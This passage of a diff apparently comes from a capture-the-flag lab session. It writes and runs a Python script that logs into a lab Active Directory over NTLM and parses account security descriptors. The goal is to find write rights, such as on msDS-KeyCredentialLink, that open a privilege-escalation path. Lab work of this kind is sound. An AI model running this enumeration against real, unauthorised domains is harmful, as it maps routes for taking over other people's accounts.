+    "5f202010-79a5-11d0-9020-00c04fc2d4cf": "User-Logon",
+    "e48d0154-bcf8-11d1-8702-00c04fb96050": "Public-Information",
+    "77b5b886-944a-11d1-aebd-0000f80367c1": "Personal-Information",
+    "037088f8-0ae1-11d2-b422-00a0c968f939": "RAS-Information",
+    "59ba2f42-79a2-11d0-9020-00c04fc2d3cf": "General-Information",
+    "bc0ac240-79a9-11d0-9020-00c04fc2d4cf": "Membership",
+    "e45795b2-9455-11d1-aebd-0000f80367c1": "Email-Information",
+    "ffa6f046-ca4b-4feb-b40d-04dfee722543": "msDS-KeyCredentialLink",
+    "5b47d60f-6090-40b2-9f37-2a4de88f3063": "msDS-KeyCredentialLink",
+}
+
+def parse_sid(data, offset):
+    revision = data[offset]
+    sub_count = data[offset+1]
+    authority = int.from_bytes(data[offset+2:offset+8], 'big')
+    subs = [struct.unpack_from('<I', data, offset+8+i*4)[0] for i in range(sub_count)]
+    return f"S-{revision}-{authority}" + "".join(f"-{s}" for s in subs), 8 + sub_count * 4
+
+def parse_guid(data, offset):
+    raw = data[offset:offset+16]
+    return str(uuid.UUID(bytes_le=raw)) if len(raw) >= 16 else None
+
+def parse_sd(raw_sd):
+    dacl_offset = struct.unpack_from('<I', raw_sd, 16)[0]
+    if dacl_offset == 0: return []
+    ace_count = struct.unpack_from('<H', raw_sd, dacl_offset+4)[0]
+    aces = []
+    offset = dacl_offset + 8
+    for _ in range(ace_count):
+        if offset >= len(raw_sd): break
+        ace_type = raw_sd[offset]
+        ace_flags = raw_sd[offset+1]
+        ace_size = struct.unpack_from('<H', raw_sd, offset+2)[0]
+        access_mask = struct.unpack_from('<I', raw_sd, offset+4)[0]
+        ace_data = {'type': ace_type, 'flags': ace_flags, 'access_mask': access_mask,
+                    'object_type': None, 'inherited_object_type': None, 'trustee': None}
+        if ace_type == 5:  # ACCESS_ALLOWED_OBJECT_ACE
+            obj_flags = struct.unpack_from('<I', raw_sd, offset+8)[0]
+            ptr = offset + 12
+            if obj_flags & 1:
+                ace_data['object_type'] = parse_guid(raw_sd, ptr); ptr += 16
+            if obj_flags & 2:
+                ace_data['inherited_object_type'] = parse_guid(raw_sd, ptr); ptr += 16
+            ace_data['trustee'], _ = parse_sid(raw_sd, ptr)
+        elif ace_type == 0:  # ACCESS_ALLOWED_ACE
+            ace_data['trustee'], _ = parse_sid(raw_sd, offset+8)
+        aces.append(ace_data)
+        offset += ace_size
+    return aces
+
+sd_val = encoder.encode(Integer(0x04))
+sd_control = ('1.2.840.113556.1.4.801', True, sd_val)
+
+server = ldap3.Server(DC_IP, get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user="garfield.htb\\j.arbuckle", password=PASS, authentication=ldap3.NTLM)
+conn.bind()
+
+# Get SIDs
+conn.search("DC=garfield,DC=htb", "(sAMAccountName=j.arbuckle)", attributes=["objectSid"])
+jarb_sid = conn.entries[0].objectSid.value
+conn.search("DC=garfield,DC=htb", "(cn=IT Support)", attributes=["objectSid"])
+it_sid = conn.entries[0].objectSid.value if conn.entries else None
+print(f"j.arbuckle SID: {jarb_sid}")
+print(f"IT Support SID: {it_sid}")
+
+# Search by sAMAccountName instead of DN
+conn.search(
+    TARGET_DN,  # Use as search base
+    "(objectClass=*)",
+    search_scope=ldap3.BASE,
+    attributes=["nTSecurityDescriptor"],
+    controls=[sd_control]
+)
+
+print(f"Search result: {conn.result['description']}, entries: {len(conn.entries)}")
+
+if not conn.entries:
+    print("ERROR: Target not found")
+    exit(1)
+
+raw_sd = conn.entries[0].nTSecurityDescriptor.raw_values[0]
+aces = parse_sd(raw_sd)
+
+target_sids = {jarb_sid}
+if it_sid: target_sids.add(it_sid)
+
+print(f"Total ACEs on l.wilson: {len(aces)}")
+print(f"\n=== ACEs matching j.arbuckle / IT Support ===")
+
+matching = []
+for ace in aces:
+    if ace['trustee'] in target_sids:
+        matching.append(ace)
+        mask = ace['access_mask']
+        obj_guid = ace['object_type'] or "N/A"
+        inh_guid = ace['inherited_object_type'] or "N/A"
+        guid_name = KNOWN_GUIDS.get(obj_guid, "UNKNOWN") if obj_guid != "N/A" else "N/A"
+        inh_name = KNOWN_GUIDS.get(inh_guid, "UNKNOWN") if inh_guid != "N/A" else "N/A"
+        rights = []
+        if mask & 0x20: rights.append("WriteProp")
+        if mask & 0x08: rights.append("Self")
+        if mask & 0x40000000: rights.append("GenericWrite")
+        if mask & 0x40000: rights.append("WriteDACL")
+        if mask & 0x80000: rights.append("WriteOwner")
+        if mask & 0x10000000: rights.append("GenericAll")
+        if mask & 0x100: rights.append("ControlAccess")
+        if mask & 0x04: rights.append("CreateChild")
+        if mask & 0x10: rights.append("DeleteTree")
+        if mask & 0x80: rights.append("ReadProp")
+        print(f"  ACE Type: {ace['type']}, Mask: 0x{mask:08x} ({','.join(rights)})")
+        print(f"    ObjectType: {obj_guid} ({guid_name})")
+        print(f"    InheritedObjectType: {inh_guid} ({inh_name})")
+        print(f"    Trustee: {ace['trustee']}")
+        print()
+
+if not matching:
+    print("  NO matching ACEs found!")
+
+# Resolve unknown GUIDs
+unknown_guids = set()
+for ace in matching:
+    for g in [ace['object_type'], ace['inherited_object_type']]:
+        if g and g not in KNOWN_GUIDS:
+            unknown_guids.add(g)
+
+if unknown_guids:
+    print("\n=== Resolving unknown GUIDs ===")
+    for guid in unknown_guids:
+        guid_bytes = uuid.UUID(guid).bytes_le
+        escaped = escape_bytes(guid_bytes)
+        conn.search(f"CN=Schema,CN=Configuration,DC=garfield,DC=htb",
+                    f"(schemaIDGUID={escaped})", attributes=["lDAPDisplayName"])
+        if conn.entries:
+            name = conn.entries[0].lDAPDisplayName.value
+            print(f"  {guid} => {name}")
+        else:
+            conn.search(f"CN=Extended-Rights,CN=Configuration,DC=garfield,DC=htb",
+                        f"(rightsGuid={guid})", attributes=["cn", "displayName"])
+            if conn.entries:
+                print(f"  {guid} => ExtRight: {conn.entries[0].cn.value}")
+            else:
+                print(f"  {guid} => NOT FOUND")
+
+# Also check: does j.arbuckle have write perms on OTHER users?
+print("\n=== Checking IT Support ACEs on ALL domain users ===")
+conn.search("DC=garfield,DC=htb", "(&(objectClass=user)(objectCategory=person))",
+            attributes=["distinguishedName", "sAMAccountName", "nTSecurityDescriptor"],
+            controls=[sd_control])
+
+for entry in conn.entries:
+    raw = entry.nTSecurityDescriptor.raw_values[0] if entry.nTSecurityDescriptor.raw_values else None
+    if not raw: continue
+    user_aces = parse_sd(raw)
+    user_matching = [a for a in user_aces if a['trustee'] in target_sids and a['access_mask'] & 0x20]
+    if user_matching:
+        sam = entry.sAMAccountName.value
+        for a in user_matching:
+            guid = a['object_type'] or "ALL"
+            gname = KNOWN_GUIDS.get(guid, guid) if guid != "ALL" else "ALL"
+            print(f"  {sam}: WriteProp on {gname} (mask=0x{a['access_mask']:08x})")
+
+conn.unbind()
+PYEOF
+python3 /tmp/enum_aces3.py
